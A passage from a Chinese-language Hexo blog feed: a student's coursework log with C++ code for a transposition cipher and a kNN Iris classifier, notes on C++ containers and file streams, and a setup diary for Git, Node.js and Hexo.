id="4、最终成果-1"><a href="#4、最终成果-1" class="headerlink" title="4、最终成果"></a>4、最终成果</h3><pre><code class="c++">#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;class Chinese&#123;public:    void input(string plaintext)//输入明文    &#123;        int i;        m_textnum = plaintext.size();        for (i = 0; plaintext[i] != 0; i++)        &#123;            m_plaintext[i] = plaintext[i];        &#125;    &#125;    void input_rownum(int rownum)//输入行数    &#123;        m_rownum = rownum;    &#125;    void turn01()//明文中偶数列逆置    &#123;        int s = -1;//状态变量，1—奇，-1—偶        int i, j, k;//循环变量        int item = 0;//中间变量        for (i = 0; m_plaintext[i] != 0; i++)        &#123;            if (i % m_rownum == 0)            &#123;                s *= -1;            &#125;            if (i % m_rownum == 0 &amp;&amp; s == -1)            &#123;                for (j = i, k = 1; j &lt; (i + m_rownum - k); j++, k++)                &#123;                    item = m_plaintext[j];                    m_plaintext[j] = m_plaintext[i + m_rownum - k];                    m_plaintext[i + m_rownum - k] = item;                &#125;            &#125;        &#125;    &#125;    void turn02()//明文按行放置形成密文    &#123;        int i, j, k = 0;        for (i = 1; i &lt; m_rownum; i++)//余数依次增大        &#123;            for (j = m_textnum; j &gt;= 0; j--)            &#123;                if (j % m_rownum == i)                &#123;                    m_ciphertext[k++] = m_plaintext[j - 1];                &#125;            &#125;        &#125;        for (j = m_textnum; j &gt;= 0; j--)//整除情况        &#123;            if (j % m_rownum == 0)                m_ciphertext[k++] = m_plaintext[j - 1];        &#125;    &#125;    void output()//输出密文    &#123;        int i;        for (i = 0; m_ciphertext[i] != 0; i++)        &#123;            cout &lt;&lt; (char)m_ciphertext[i];        &#125;        cout &lt;&lt; &quot;\n&quot;;    &#125;private:    int m_plaintext[1000] = &#123; 0 &#125;;    int m_textnum = 0;    int m_rownum = 0;    int m_ciphertext[1000] = &#123; 0 &#125;;&#125;;int main()&#123;    Chinese c;    string plaintext;    int rownum = 0;    cout &lt;&lt; &quot;请输入明文：&quot; &lt;&lt; endl;    cin &gt;&gt; plaintext;    c.input(plaintext);    cout &lt;&lt; &quot;请输入目标行数：&quot; &lt;&lt; endl;    cin &gt;&gt; rownum;    c.input_rownum(rownum);    c.turn01();    c.turn02();    c.output();    system(&quot;pause&quot;);    return 0;&#125;</code></pre><h3 id="5、测试-1"><a href="#5、测试-1" class="headerlink" title="5、测试"></a>5、测试</h3><p><img src="/../../../../../pic/%E6%B5%8B%E8%AF%95-165114992515518.jpg" alt="测试"></p><p><img src="/../../../../../pic/%E6%B5%8B%E8%AF%952-165114992782320.jpg" alt="测试2"></p><h2 id="5、kNN算法的实现"><a href="#5、kNN算法的实现" class="headerlink" title="5、kNN算法的实现"></a>5、kNN算法的实现</h2><h3 id="1、数据集下载"><a href="#1、数据集下载" class="headerlink" title="1、数据集下载"></a>1、数据集下载</h3><p>下载地址：<a href="http://archive.ics.uci.edu/ml/index.php">http://archive.ics.uci.edu/ml/index.php</a></p><p><img src="/../../../../../pic/%E6%95%B0%E6%8D%AE%E9%9B%86%E4%B8%8B%E8%BD%BD.jpg" alt="数据集下载"></p><p>选择下载鸢尾花数据集</p><p><img src="/../../../../../pic/%E9%80%89%E6%8B%A9%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86.jpg" alt="选择鸢尾花数据集"></p><h3 id="2、结构体的构造"><a href="#2、结构体的构造" class="headerlink" title="2、结构体的构造"></a>2、结构体的构造</h3><pre><code class="c++">typedef struct my&#123;    vector&lt;float&gt; attribute;    string label;    float distance = 0;&#125;Data;</code></pre><h3 id="3、数据集以txt格式输入程序"><a href="#3、数据集以txt格式输入程序" class="headerlink" title="3、数据集以txt格式输入程序"></a>3、数据集以txt格式输入程序</h3><p>知识点：C++的文件操作<br>参考教程：<a href="http://c.biancheng.net/view/7591.html">C++文件类（文件流类）及用法详解</a></p><p><a href="https://www.bilibili.com/video/BV1Br4y1P7vt?from=search&seid=10903177255095331889">[C++：不如Coding]（27）：文件操作(1)：使用文件流简单地读取和写入文件</a></p><h3 id="4、输入函数的实现"><a href="#4、输入函数的实现" class="headerlink" title="4、输入函数的实现"></a>4、输入函数的实现</h3><h4 id="1、训练集输入"><a href="#1、训练集输入" class="headerlink" title="1、训练集输入"></a>1、训练集输入</h4><pre><code class="c++">void input_d(vector&lt;Data&gt;&amp; dataset, int m)&#123;    int i, j, n = 0;    float item;    string label;    cout &lt;&lt; &quot;请输入训练集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; n;        cout &lt;&lt; &quot;请输入训练集：&quot; &lt;&lt; endl;    for (j = 0; j &lt; n; j++)    &#123;        Data t;        for (i = 0; i &lt; m; i++)        &#123;            cin &gt;&gt; item;            t.attribute.push_back(item);            //dataset.attribute.push_back(item);        &#125;        dataset.push_back(t);        cin &gt;&gt; dataset[j].label;    &#125;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E6%A3%80%E9%AA%8C%E8%BE%93%E5%85%A5%E8%AE%AD%E7%BB%83%E9%9B%86.jpg" alt="检验输入训练集"></p><h4 id="2、测试集输入"><a href="#2、测试集输入" class="headerlink" title="2、测试集输入"></a>2、测试集输入</h4><pre><code class="c++">void input_t(vector&lt;Data&gt;&amp; testset, int m)&#123;    int i, j, n = 0;    float item;    cout &lt;&lt; &quot;请输入测试集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; n;    cout &lt;&lt; &quot;请输入测试集：&quot; &lt;&lt; endl;    for (j = 0; j &lt; n; j++)    &#123;        Data t;        for (i = 0; i &lt; m; i++)        &#123;            cin &gt;&gt; item;            t.attribute.push_back(item);        &#125;        testset.push_back(t);    &#125;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E6%A3%80%E9%AA%8C%E8%BE%93%E5%85%A5%E6%B5%8B%E8%AF%95%E9%9B%86.jpg" alt="检验输入测试集"></p><h3 id="5、计算距离函数构造"><a href="#5、计算距离函数构造" class="headerlink" title="5、计算距离函数构造"></a>5、计算距离函数构造</h3><pre><code class="c++">void distance(vector&lt;Data&gt;&amp; dataset, Data&amp; testset)&#123;    unsigned int i, j;    for (i = 0; i &lt; dataset.size(); i++)    &#123;        float sum = 0.0;        for (j = 0; j &lt; dataset[i].attribute.size(); j++)        &#123;            sum += (dataset[i].attribute[j] - testset.attribute[j]) * (dataset[i].attribute[j] - testset.attribute[j]);        &#125;        dataset[i].distance = sqrt(sum);    &#125;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E6%A3%80%E9%AA%8C%E8%B7%9D%E7%A6%BB%E8%AE%A1%E7%AE%97.jpg" alt="检验距离计算"></p><h3 id="6、排序函数构造"><a href="#6、排序函数构造" class="headerlink" title="6、排序函数构造"></a>6、排序函数构造</h3><blockquote><p>排序方法：冒泡排序</p></blockquote><pre><code class="c++">void sort(vector&lt;Data&gt;&amp; dataset)&#123;    unsigned int i, j;        for (i = 0; i &lt; dataset.size(); i++)    &#123;        for (j = i + 1; j &lt; dataset.size(); j++)        &#123;            if (dataset[i].distance &gt; dataset[j].distance)            &#123;                Data item = dataset[i];                dataset[i] = dataset[j];                dataset[j] = item;            &#125;        &#125;    &#125;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E6%A3%80%E9%AA%8C%E6%8E%92%E5%BA%8F.jpg" alt="检验排序"></p><h3 id="7、分类函数构造"><a href="#7、分类函数构造" class="headerlink" title="7、分类函数构造"></a>7、分类函数构造</h3><pre><code class="c++">void classify(vector&lt;Data&gt;&amp; dataset, Data&amp; testset, int k)&#123;    int i;    map&lt;string, int&gt; label;        for (i = 0; i &lt; k; i++)    &#123;        label[dataset[i].label]++;    &#125;    int max = label[dataset[0].label];    for (map&lt;string, int&gt;::iterator iter = label.begin(); iter != label.end(); iter++)    &#123;        if (iter-&gt;second &gt; max)        &#123;            max = iter-&gt;second;        &#125;        //cout &lt;&lt; &quot;类别：&quot; &lt;&lt; iter-&gt;first &lt;&lt; &quot;\t次数：&quot; &lt;&lt; iter-&gt;second &lt;&lt; endl;    &#125;    for (map&lt;string, int&gt;::iterator iter = label.begin(); iter != label.end(); iter++)    &#123;        if (iter-&gt;second == max)        &#123;            testset.label = iter-&gt;first;        &#125;    &#125;    cout &lt;&lt; testset.label &lt;&lt; endl;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E6%A3%80%E9%AA%8C%E5%88%86%E7%B1%BB.jpg" alt="检验分类"></p><h3 id="8、最后成果"><a href="#8、最后成果" class="headerlink" title="8、最后成果"></a>8、最后成果</h3><pre><code class="c++">#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include &lt;map&gt;using namespace std;typedef struct my&#123;    vector&lt;float&gt; attribute;    string label;    float distance = 0;&#125;Data;void input_d(vector&lt;Data&gt;&amp; dataset, int m)&#123;    int i, j, n = 0;    float item;    string label;    cout &lt;&lt; &quot;请输入训练集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; n;        cout &lt;&lt; &quot;请输入训练集：&quot; &lt;&lt; endl;    for (j = 0; j &lt; n; j++)    &#123;        Data t;        for (i = 0; i &lt; m; i++)        &#123;            cin &gt;&gt; item;            t.attribute.push_back(item);            //dataset.attribute.push_back(item);        &#125;        dataset.push_back(t);        cin &gt;&gt; dataset[j].label;    &#125;&#125;void input_t(vector&lt;Data&gt;&amp; testset, int m)&#123;    int i, j, n = 0;    float item;    cout &lt;&lt; &quot;请输入测试集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; n;    cout &lt;&lt; &quot;请输入测试集：&quot; &lt;&lt; endl;    for (j = 0; j &lt; n; j++)    &#123;        Data t;        for (i = 0; i &lt; m; i++)        &#123;            cin &gt;&gt; item;            t.attribute.push_back(item);        &#125;        testset.push_back(t);    &#125;&#125;void distance(vector&lt;Data&gt;&amp; dataset, Data&amp; testset)&#123;    unsigned int i, j;    for (i = 0; i &lt; dataset.size(); i++)    &#123;        float sum = 0.0;        for (j = 0; j &lt; dataset[i].attribute.size(); j++)        &#123;            sum += (dataset[i].attribute[j] - testset.attribute[j]) * (dataset[i].attribute[j] - testset.attribute[j]);        &#125;        dataset[i].distance = sqrt(sum);    &#125;&#125;void sort(vector&lt;Data&gt;&amp; dataset)&#123;    unsigned int i, j;        for (i = 0; i &lt; dataset.size(); i++)    &#123;        for (j = i + 1; j &lt; dataset.size(); j++)        &#123;            if (dataset[i].distance &gt; dataset[j].distance)            &#123;                Data item = dataset[i];                dataset[i] = dataset[j];                dataset[j] = item;            &#125;        &#125;    &#125;&#125;void classify(vector&lt;Data&gt;&amp; dataset, Data&amp; testset, int k)&#123;    int i;    map&lt;string, int&gt; label;        for (i = 0; i &lt; k; i++)    &#123;        label[dataset[i].label]++;    &#125;    int max = label[dataset[0].label];    for (map&lt;string, int&gt;::iterator iter = label.begin(); iter != label.end(); iter++)    &#123;        if (iter-&gt;second &gt; max)        &#123;            max = iter-&gt;second;        &#125;        //cout &lt;&lt; &quot;类别：&quot; &lt;&lt; iter-&gt;first &lt;&lt; &quot;\t次数：&quot; &lt;&lt; iter-&gt;second &lt;&lt; endl;    &#125;    for (map&lt;string, int&gt;::iterator iter = label.begin(); iter != label.end(); iter++)    &#123;        if (iter-&gt;second == max)        &#123;            testset.label = iter-&gt;first;        &#125;    &#125;    cout &lt;&lt; testset.label &lt;&lt; endl;&#125;int main()&#123;    unsigned int i;    int k = 0;    int m = 0;//数据属性的维数    vector&lt;Data&gt; dataset;    vector&lt;Data&gt; testset;    cout &lt;&lt; &quot;请输入数据属性的维数：&quot; &lt;&lt; endl;    cin &gt;&gt; m;        input_d(dataset, m);//输入训练集    input_t(testset, m);//输入测试集    cout &lt;&lt; &quot;输入您期望的k值：&quot; &lt;&lt; endl;//输入k值    cin &gt;&gt; k;    for (i = 0; i &lt; testset.size(); i++)    &#123;        distance(dataset, testset[i]);//计算每个测试数据与每个训练数据的距离                sort(dataset);//升序排序        classify(dataset, testset[i], k);    &#125;        system(&quot;pause&quot;);    return 0;&#125;</code></pre><p>测试：</p><p><img src="/../../../../../pic/%E5%88%86%E7%B1%BB%E6%88%90%E5%8A%9F.jpg" alt="分类成功"></p><h3 id="9、输入函数重新设计-文件流形式"><a href="#9、输入函数重新设计-文件流形式" class="headerlink" title="9、输入函数重新设计(文件流形式)"></a>9、输入函数重新设计(文件流形式)</h3><h4 id="1、训练集输入-1"><a href="#1、训练集输入-1" class="headerlink" title="1、训练集输入"></a>1、训练集输入</h4><pre><code class="c++">void input_d(vector&lt;Data&gt;&amp; dataset, int n)&#123;    int i, j, size = 0;    float item;    ifstream asd;    cout &lt;&lt; &quot;请输入训练集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; size;    asd.open(&quot;iris_train.txt&quot;);    if (!asd.is_open())    &#123;        cout &lt;&lt; &quot;打开文件失败！&quot; &lt;&lt; endl;        return;    &#125;    for (j = 0; j &lt; size; j++)    &#123;        Data t;        //asd &gt;&gt; t.label;        for (i = 0; i &lt; n; i++)        &#123;            asd &gt;&gt; item;            t.attribute.push_back(item);        &#125;        asd &gt;&gt; t.label;        dataset.push_back(t);    &#125;    asd.close();    //output(dataset, size, n);&#125;</code></pre><h4 id="2、测试集输入-1"><a href="#2、测试集输入-1" class="headerlink" title="2、测试集输入"></a>2、测试集输入</h4><pre><code class="c++">void input_t(vector&lt;Data&gt;&amp; dataset, int n)&#123;    int i, j, size = 0;    float item;    ifstream asd;    cout &lt;&lt; &quot;请输入测试集的大小：&quot; &lt;&lt; endl;    cin &gt;&gt; size;    asd.open(&quot;iris_test.txt&quot;);    if (!asd.is_open())    &#123;        cout &lt;&lt; &quot;打开文件失败！&quot; &lt;&lt; endl;        return;    &#125;    for (j = 0; j &lt; size; j++)    &#123;        Data t;        for (i = 0; i &lt; n; i++)        &#123;            asd &gt;&gt; item;            t.attribute.push_back(item);        &#125;        dataset.push_back(t);    &#125;    asd.close();    //output(dataset, size, n);&#125;</code></pre><p><strong>好处：</strong>简化输入步骤，方便大型数据集的输入</p><h3 id="10、其他数据集的测试"><a href="#10、其他数据集的测试" class="headerlink" title="10、其他数据集的测试"></a>10、其他数据集的测试</h3><p>测试数据集：鲍鱼、葡萄酒</p><p>下图为针对葡萄酒数据集，计算距离函数的修改</p><p><img src="/../../../../../pic/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E9%9B%86.jpg" alt="其他数据集"></p><p><strong>结果：</strong></p><p><img src="/../../../../../pic/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E9%9B%86%E7%BB%93%E6%9E%9C.jpg" alt="其他数据集结果"></p><h2 id="6、收获"><a href="#6、收获" class="headerlink" title="6、收获"></a>6、收获</h2><h3 id="1、智能指针"><a href="#1、智能指针" class="headerlink" title="1、智能指针"></a>1、智能指针</h3><blockquote><ul><li><strong>what：</strong><br>C++新标准库提供了智能指针来管理动态对象，它的行为类似于常规指针，重要的区别是它能够自动释放所指向对象的空间，并且它是封装好的模板类</li><li><strong>why：</strong><br>为了安全方便地使用动态内存，管理动态内存的开辟与释放，避免内存泄露。</li><li><strong>how：</strong><br>智能指针分为四种：<strong>auto_ptr</strong>、<strong>shared_ptr</strong>、<strong>unique_ptr</strong>、<strong>weak_ptr</strong></li></ul></blockquote><h4 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="unique_ptr"></a>unique_ptr</h4><blockquote><p><strong>初始化方法</strong></p><ul><li><p>方法一：<br>std::unique_ptr&lt;类型&gt; p1(new 类型(值));</p></li><li><p>方法二：<br>std::unique_ptr&lt;类型&gt; p1<br>p1.reset(new 类型(值));</p></li></ul></blockquote><h3 id="2、封装"><a href="#2、封装" class="headerlink" title="2、封装"></a>2、封装</h3><blockquote><p><strong>封装的意义：</strong></p><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul></blockquote><p><strong>语法：</strong><code>class 类名&#123;  访问权限：属性/行为&#125;;</code></p><blockquote><p><strong>访问权限：</strong></p><ul><li>公共权限：public            类内可以访问   类外可以访问</li><li>保护权限：protected      类内可以访问   类外不可以访问</li><li>私有权限：private           类内可以访问   类外不可以访问</li></ul></blockquote><h3 id="3、C-文件和流"><a href="#3、C-文件和流" class="headerlink" title="3、C++ 文件和流"></a>3、C++ 文件和流</h3><table><thead><tr><th align="left">数据类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">ofstream</td><td align="left">该数据类型表示输出文件流，用于创建文件并向文件写入信息。</td></tr><tr><td align="left">ifstream</td><td align="left">该数据类型表示输入文件流，用于从文件读取信息。</td></tr><tr><td align="left">fstream</td><td align="left">该数据类型通常表示文件流，且同时具有 ofstream 和 ifstream 两种功能，这意味着它可以创建文件，向文件写入信息，从文件读取信息。</td></tr></tbody></table><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>基础语法：</p><pre><code class="c++">void open(const char *filename, ios::openmode mode);</code></pre><p>在这里，<strong>open()</strong> 成员函数的第一参数指定要打开的文件的名称和位置，第二个参数定义文件被打开的模式。</p><table><thead><tr><th align="left">模式标志</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">ios::app</td><td align="left">追加模式。所有写入都追加到文件末尾。</td></tr><tr><td align="left">ios::ate</td><td align="left">文件打开后定位到文件末尾。</td></tr><tr><td align="left">ios::in</td><td align="left">打开文件用于读取。</td></tr><tr><td align="left">ios::out</td><td align="left">打开文件用于写入。</td></tr><tr><td align="left">ios::trunc</td><td align="left">如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。</td></tr></tbody></table><h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>基础语法：</p><pre><code class="c++">void close();</code></pre><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>在 C++ 编程中，我们使用流插入运算符（ &lt;&lt; ）向文件写入信息，就像使用该运算符输出信息到屏幕上一样。唯一不同的是，在这里您使用的是 <strong>ofstream</strong> 或 <strong>fstream</strong> 对象，而不是 <strong>cout</strong> 对象。</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>在 C++ 编程中，我们使用流提取运算符（ &gt;&gt; ）从文件读取信息，就像使用该运算符从键盘输入信息一样。唯一不同的是，在这里您使用的是 <strong>ifstream</strong> 或 <strong>fstream</strong> 对象，而不是 <strong>cin</strong> 对象。</p><h3 id="4、vector容器的使用"><a href="#4、vector容器的使用" class="headerlink" title="4、vector容器的使用"></a>4、vector容器的使用</h3><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><pre><code class="c++">vector&lt;T&gt; v;       //采用模板实现类实现，默认构造函数vector(v.begin() , v.end( ));//将v[begin(), end())区间中的元素拷贝给本身vector(n,elem);    //构造函数将n个elem拷贝给本身。vector( const vector &amp;vec) ; //拷贝构造函数。</code></pre><h4 id="插入函数"><a href="#插入函数" class="headerlink" title="插入函数"></a>插入函数</h4><pre><code class="c++">push_back(ele);//尾部插入元素elepop_back() ;//删除最后一个元素insert(const_iterator pos, ele);//迭代器指向位置pos插入元素eleinsert(const_iterator pos，int count,ele);//迭代器指向位置pos插入count个元素erase(const_iterator pos ) ;//册除迭代器指向的元素erase(const_iterator start, const_iterator end);//删除迭代器从start到end之间的元素clear();clear();//册除容器中所有元素</code></pre><h3 id="5、map容器的使用"><a href="#5、map容器的使用" class="headerlink" title="5、map容器的使用"></a>5、map容器的使用</h3><p><strong>简介：</strong></p><ul><li>map中所有元素都是pair</li><li>pair中第一个元素为<strong>key(键值)<strong>，起到索引作期，第二个元素为</strong>value (实值)</strong></li><li>所有元素都会根据元素的键值自动排序</li></ul><p><strong>用途：</strong>提供一对一的映射矢系</p><h4 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h4><pre><code class="c++">map&lt;T1，T2&gt; mp;         //map默认构造函数:map(const map &amp;mp ) ;   //拷贝构造函数</code></pre><h4 id="插入函数-1"><a href="#插入函数-1" class="headerlink" title="插入函数"></a>插入函数</h4><pre><code class="c++">//第一种m. insert(pair&lt;int，int&gt;(1，10) ) ;//第二种m. insert (make_pair(2，20) ) ;//第三种m.insert (map&lt;int， int&gt; : : value_type(3，30) ) ;//第四种m[4] = 40;</code></pre>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Record（0）</title>
      <link href="/2021/03/20/Record%EF%BC%880%EF%BC%89/"/>
      <url>/2021/03/20/Record%EF%BC%880%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Record（0）"><a href="#Record（0）" class="headerlink" title="Record（0）"></a>Record（0）</h1><h2 id="1、创建GitHub仓库"><a href="#1、创建GitHub仓库" class="headerlink" title="1、创建GitHub仓库"></a>1、创建GitHub仓库</h2><p><img src="/../pic/1.jpg" alt="1"></p><h4 id="配置仓库信息"><a href="#配置仓库信息" class="headerlink" title="配置仓库信息"></a>配置仓库信息</h4><p><img src="/../pic/2.jpg" alt="2"></p><h4 id="创建成功（仓库界面）"><a href="#创建成功（仓库界面）" class="headerlink" title="创建成功（仓库界面）"></a>创建成功（仓库界面）</h4><p><img src="/../pic/3.jpg" alt="3"></p><h2 id="2、安装Git"><a href="#2、安装Git" class="headerlink" title="2、安装Git"></a>2、安装Git</h2><h4 id="1、下载Git"><a href="#1、下载Git" class="headerlink" title="1、下载Git"></a>1、下载Git</h4><p>网址：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a><br><img src="/../pic/4.jpg" alt="4"></p><h4 id="2、全部默认配置安装"><a href="#2、全部默认配置安装" class="headerlink" title="2、全部默认配置安装"></a>2、全部默认配置安装</h4><p><img src="/../pic/5.jpg" alt="5"></p><h4 id="3、安装成功"><a href="#3、安装成功" class="headerlink" title="3、安装成功"></a>3、安装成功</h4><p><img src="/../pic/6.jpg" alt="6"></p><h4 id="4、配置Git"><a href="#4、配置Git" class="headerlink" title="4、配置Git"></a>4、配置Git</h4><p><img src="/../pic/7.jpg" alt="7"><br>打开C:\Users\NeWer.ssh目录下的id_rsa.pub文件<br><img src="/../pic/8.jpg" alt="8"><br>打开<a href="https://github.com/settings/keys">https://github.com/settings/keys</a><br><img src="/../pic/9.jpg" alt="9"></p><p><img src="/../pic/10.jpg" alt="10"><br>在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:&#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;</a><br><img src="/../pic/11.jpg" alt="11"><br>创建成功</p><h4 id="5、创建版本库"><a href="#5、创建版本库" class="headerlink" title="5、创建版本库"></a>5、创建版本库</h4><p><img src="/../pic/13.jpg" alt="13"></p><p>利用Notepad++编写readme.txt文件检验仓库是否可以正常运行<br><img src="/../pic/14.jpg" alt="14"></p><h4 id="bug-1"><a href="#bug-1" class="headerlink" title="bug.1"></a>bug.1</h4><p><img src="/../pic/Debug.1.jpg" alt="Debug.1"></p><h2 id="3、安装Node-js"><a href="#3、安装Node-js" class="headerlink" title="3、安装Node.js"></a>3、安装Node.js</h2><h4 id="1-1、下载Node-js"><a href="#1-1、下载Node-js" class="headerlink" title="1.1、下载Node.js"></a>1.1、下载Node.js</h4><p>下载地址：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br><img src="/../pic/32.jpg" alt="32"></p><h4 id="2-1、安装Node-js"><a href="#2-1、安装Node-js" class="headerlink" title="2.1、安装Node.js"></a>2.1、安装Node.js</h4><p><img src="/../pic/33.jpg" alt="33"></p><h4 id="2-2、同意协议"><a href="#2-2、同意协议" class="headerlink" title="2.2、同意协议"></a>2.2、同意协议</h4><p><img src="/../pic/34.jpg" alt="34"></p><h4 id="2-3、选择安装位置"><a href="#2-3、选择安装位置" class="headerlink" title="2.3、选择安装位置"></a>2.3、选择安装位置</h4><p><img src="/../pic/35.jpg" alt="35"></p><h4 id="2-4、选择安装所需功能"><a href="#2-4、选择安装所需功能" class="headerlink" title="2.4、选择安装所需功能"></a>2.4、选择安装所需功能</h4><p><img src="/../pic/36.jpg" alt="36"></p><h4 id="2-5、勾选自动安装工具"><a href="#2-5、勾选自动安装工具" class="headerlink" title="2.5、勾选自动安装工具"></a>2.5、勾选自动安装工具</h4><p><img src="/../pic/37.jpg" alt="37"></p><p><img src="/../pic/38.jpg" alt="38"></p><h4 id="2-6、完成安装"><a href="#2-6、完成安装" class="headerlink" title="2.6、完成安装"></a>2.6、完成安装</h4><p><img src="/../pic/39.jpg" alt="39"></p><h4 id="3-1、自动安装所需功能"><a href="#3-1、自动安装所需功能" class="headerlink" title="3.1、自动安装所需功能"></a>3.1、自动安装所需功能</h4><p><img src="/../pic/40.jpg" alt="40"></p><p><img src="/../pic/41.jpg" alt="41"></p><h4 id="3-2、安装日志"><a href="#3-2、安装日志" class="headerlink" title="3.2、安装日志"></a>3.2、安装日志</h4><p><img src="/../pic/42.jpg" alt="42"></p><p><img src="/../pic/43.jpg" alt="43"></p><p><img src="/../pic/44.jpg" alt="44"></p><p><img src="/../pic/45.jpg" alt="45"></p><h4 id="3-3、安装完成"><a href="#3-3、安装完成" class="headerlink" title="3.3、安装完成"></a>3.3、安装完成</h4><p><img src="/../pic/46.jpg" alt="46"></p><h2 id="4、搭建个人博客"><a href="#4、搭建个人博客" class="headerlink" title="4、搭建个人博客"></a>4、搭建个人博客</h2><h3 id="1、安装Hexo"><a href="#1、安装Hexo" class="headerlink" title="1、安装Hexo"></a>1、安装Hexo</h3><p><img src="/../pic/62.jpg" alt="62"></p><h4 id="1、BUG"><a href="#1、BUG" class="headerlink" title="1、BUG"></a>1、BUG</h4><p><img src="/../pic/Debug.4.jpg" alt="Debug.4"></p><p>解决方法：<a href="https://blog.csdn.net/qq_40954793/article/details/85606605">https://blog.csdn.net/qq_40954793/article/details/85606605</a><br>原因： fsevent是mac osx系统的，在win或者Linux下使用了 所以会有警告，忽略就好了，意思就是你已经安装成功了</p><h4 id="2、BUG"><a href="#2、BUG" class="headerlink" title="2、BUG"></a>2、BUG</h4><p><img src="/../pic/Debug.5.jpg" alt="Debug.5"></p><p>解决过程：打开VPN（不知道是不是GitHub被墙的缘故），打开网址，找到报错代码<br><img src="/../pic/Debug.5.1.jpg" alt="Debug.5.1"><br><img src="/../pic/Debug.5.2.jpg" alt="Debug.5.2"></p><h4 id="3、安装成功，继续下一步安装"><a href="#3、安装成功，继续下一步安装" class="headerlink" title="3、安装成功，继续下一步安装"></a>3、安装成功，继续下一步安装</h4><p><img src="/../pic/63.jpg" alt="63"></p><p>顺利安装</p><p><img src="/../pic/64.jpg" alt="64"></p><h4 id="4、配置Hexo"><a href="#4、配置Hexo" class="headerlink" title="4、配置Hexo"></a>4、配置Hexo</h4><p>这里仅修改了网站标题</p><p><img src="/../pic/65.jpg" alt="65"></p><h3 id="2、Hexo指令"><a href="#2、Hexo指令" class="headerlink" title="2、Hexo指令"></a>2、Hexo指令</h3><h4 id="1、在cmd中输入-hexo-server"><a href="#1、在cmd中输入-hexo-server" class="headerlink" title="1、在cmd中输入 hexo server"></a>1、在cmd中输入 hexo server</h4><p><img src="/../pic/66.jpg" alt="66"></p><h4 id="2、可在http-localhost-4000（本地）预览网站。"><a href="#2、可在http-localhost-4000（本地）预览网站。" class="headerlink" title="2、可在http://localhost:4000（本地）预览网站。"></a>2、可在<a href="http://localhost:4000（本地）预览网站。">http://localhost:4000（本地）预览网站。</a></h4><p><img src="/../pic/67.jpg" alt="67"></p><h4 id="3、生成静态文件"><a href="#3、生成静态文件" class="headerlink" title="3、生成静态文件"></a>3、生成静态文件</h4><p><img src="/../pic/68.jpg" alt="68"></p><h4 id="4、创建一篇新文章"><a href="#4、创建一篇新文章" class="headerlink" title="4、创建一篇新文章"></a>4、创建一篇新文章</h4><pre><code class="c">hexo new page -p miscellaneous/me &quot;About me&quot;</code></pre><p><img src="/../pic/69.jpg" alt="69"></p><h4 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h4><p><img src="/../pic/Debug.6.jpg" alt="Debug.6"></p><p>解决方法：参考<a href="https://blog.csdn.net/u010263423/article/details/106981801">https://blog.csdn.net/u010263423/article/details/106981801</a></p><p>问题分析： Node 版本太高了，我的版本为v14.16.0</p><p>解决方法：换一个低版本Node</p><h4 id="5、部署到GIthub"><a href="#5、部署到GIthub" class="headerlink" title="5、部署到GIthub"></a>5、部署到GIthub</h4><ol><li><h4 id="安装-hexo-deployer-git"><a href="#安装-hexo-deployer-git" class="headerlink" title="安装 hexo-deployer-git."></a>安装 hexo-deployer-git.</h4><p><img src="/../pic/70.jpg" alt="70"></p></li><li><h4 id="在-config-yml（如果有已存在的请删除）添加如下配置："><a href="#在-config-yml（如果有已存在的请删除）添加如下配置：" class="headerlink" title="在 _config.yml（如果有已存在的请删除）添加如下配置："></a>在 <strong>_config.yml</strong>（如果有已存在的请删除）添加如下配置：</h4></li></ol><p>  <strong>&#x3D;&#x3D;这里注意repo：后面的地址改为自己的仓库地址&#x3D;&#x3D;</strong></p><p>  <img src="/../pic/71.jpg" alt="71"></p><ol start="3"><li><h4 id="运行-x3D-x3D-hexo-clean-amp-amp-hexo-deploy-x3D-x3D"><a href="#运行-x3D-x3D-hexo-clean-amp-amp-hexo-deploy-x3D-x3D" class="headerlink" title="运行 &#x3D;&#x3D;hexo clean &amp;&amp; hexo deploy&#x3D;&#x3D;"></a>运行 &#x3D;&#x3D;hexo clean &amp;&amp; hexo deploy&#x3D;&#x3D;</h4><p><img src="/../pic/72.jpg" 